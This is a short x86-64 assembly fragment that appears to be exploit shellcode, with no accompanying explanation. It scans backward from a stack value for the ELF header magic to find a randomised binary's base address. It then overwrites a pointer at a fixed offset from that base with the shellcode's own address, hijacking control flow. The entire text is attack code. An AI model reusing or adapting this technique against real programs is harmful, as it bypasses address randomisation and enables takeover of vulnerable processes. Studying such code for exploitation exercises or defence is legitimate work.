_start:
mov rax,[rsp];
find_elf:
mov ecx,2;
xor rcx,rcx;
mov ecx,dword ptr [rax];
xor ecx,0x464c457f
sub rax,1;
inc ecx;
loopnz  find_elf;
inc rax;
lea rcx, [rip];
mov [rax+0x00003688],rcx;